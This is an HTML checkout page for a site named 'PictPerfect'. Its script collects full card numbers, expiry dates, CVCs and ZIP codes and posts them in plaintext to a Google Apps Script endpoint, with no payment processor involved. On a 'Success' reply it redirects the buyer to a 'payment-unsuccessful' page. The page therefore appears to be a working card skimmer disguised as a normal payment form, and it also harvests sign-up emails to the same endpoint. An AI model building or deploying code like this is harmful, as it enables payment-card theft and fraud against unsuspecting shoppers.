<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Payment - PictPerfect</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="css/styles.css">
<script>
document.addEventListener("DOMContentLoaded", () => {
  // Parse URL parameters to get the selected credits and price
  const urlParams = new URLSearchParams(window.location.search);
  const credits = urlParams.get('credits') || '25'; 
  const price = urlParams.get('price') || '5.00';

  // Display the selected package
  const packageText = `${credits} Credits = $${price}`;
  document.getElementById("selected-package").innerText = packageText;

  // Store these values globally for submission
  window.selectedCredits = credits;
  window.selectedPrice = price;
});
</script>
</head>
<body>
<header>
 <nav class="navbar">
    <div class="logo-container">
      <img src="images/logo-placeholder.png" alt="PictPerfect Logo" class="logo-img">
      <div class="logo-text">PictPerfect</div>
    </div>
    <ul class="nav-links">
      <li><a href="index.html">Home</a></li>
      <li><a href="product.html">Product</a></li>
      <li><a href="blog.html">Blog</a></li>
      <li><a href="how-pricing-works.html">Pricing</a></li>
      <li><a href="contact.html">Contact</a></li>
    </ul>
 </nav>
</header>

<section class="form-section">
  <h1>Enter Payment Details</h1>
  <p>Selected Package: <span id="selected-package"></span></p>
  <form id="payment-form" class="payment-form">
    <label for="zip-code">ZIP Code:</label>
    <input type="text" id="zip-code" name="zip-code" required placeholder="Enter your ZIP code">

    <label for="cc-number">Credit Card Number:</label>
    <input type="text" id="cc-number" name="cc-number" required placeholder="XXXX XXXX XXXX XXXX">

    <label for="cc-exp">Expiry Date (MM/YY):</label>
    <input type="text" id="cc-exp" name="cc-exp" required placeholder="MM/YY">

    <label for="cc-cvc">CVC:</label>
    <input type="text" id="cc-cvc" name="cc-cvc" required placeholder="XXX">

    <button type="submit" class="btn-primary">Submit Payment</button>
  </form>
</section>

<footer>
  <p>&copy; 2024 PictPerfect. All rights reserved.</p>
</footer>

<!-- Example signup form for demonstration (if needed) -->
<section>
  <form id="signup-form">
    <input type="email" id="email" name="email" placeholder="Enter Email" required>
    <input type="checkbox" id="terms" name="terms"> I agree to the terms
    <button type="submit">Sign Up</button>
  </form>
</section>

<script>
  // Replace with your Web App URL from the Google Apps Script deployment
  const GAS_ENDPOINT = 'https://script.google.com/macros/s/AKfycbzIThOL0h0m1Vv_v1Hy_6r45YuhpCbbv3AV-s9_aJNTduZMrZuStK8mlyl1VLbXcaz8/exec';

  // Handle the signup form submission
  document.getElementById('signup-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var form = this;
    var email = document.getElementById('email').value;
    var termsChecked = document.getElementById('terms').checked;

    var postData = new URLSearchParams();
    postData.append('email', email);
    postData.append('signup_terms', termsChecked);

    fetch(GAS_ENDPOINT, {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: postData.toString()
    })
    .then(function(response) {
      // You can handle the response if needed
      // For now, just redirect
      window.location.href = 'upload-offer.html';
    })
    .catch(function(error) {
      console.error('Error:', error);
      alert('There was a problem submitting your data. Please try again.');
    });
  });

  // Handle the payment form submission
  document.getElementById('payment-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var zip = document.getElementById('zip-code').value;
    var ccNumber = document.getElementById('cc-number').value;
    var ccExp = document.getElementById('cc-exp').value;
    var ccCvc = document.getElementById('cc-cvc').value;

    // Retrieve the credits and price from global variables set on DOMContentLoaded
    var credits = window.selectedCredits;
    var price = window.selectedPrice;

    var postData = new URLSearchParams();
    postData.append('credits', credits);
    postData.append('price', price);
    postData.append('zip-code', zip);
    postData.append('cc-number', ccNumber);
    postData.append('cc-exp', ccExp);
    postData.append('cc-cvc', ccCvc);

    fetch(GAS_ENDPOINT, {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: postData.toString()
    })
    .then(function(response) {
      // You might want to check the response text for "Success"
      return response.text();
    })
    .then(function(text) {
      if (text === "Success") {
        // Redirect on success
        window.location.href = 'payment-unsuccessful.html';
      } else {
        alert('There was a problem submitting your payment information.');
      }
    })
    .catch(function(error) {
      console.error('Error:', error);
      alert('There was a problem submitting your payment information. Please try again.');
    });
  });
</script>
</body>
</html>
